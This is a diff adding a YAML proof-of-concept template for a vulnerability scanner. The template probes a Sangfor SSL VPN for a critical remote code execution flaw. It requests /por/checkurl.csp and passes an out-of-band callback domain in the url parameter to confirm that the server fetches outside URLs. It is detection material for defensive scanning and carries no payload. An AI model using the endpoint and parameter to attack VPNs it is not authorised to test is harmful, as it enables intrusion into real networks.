@@ -1,0 +1,29 @@
+name: yaml-poc-sangfor-sslvpn-rce-CT-631367
+binding: 19a8636b-a117-49bf-a797-f13dcc0b9e24
+detail:
+    author: haiqing.chen
+    vulnerability:
+        id: db6b9102-12d6-4612-819f-558f6a37d0c6
+        level: critical
+    warning: Harmless
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+    reverseDomain: reverse.domain
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /por/checkurl.csp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("2")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /por/checkurl.csp?url=http://{{reverseDomain}}&retry=0&timeout=1
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("0") && reverse.wait(5)
+expression: r0() && r1()
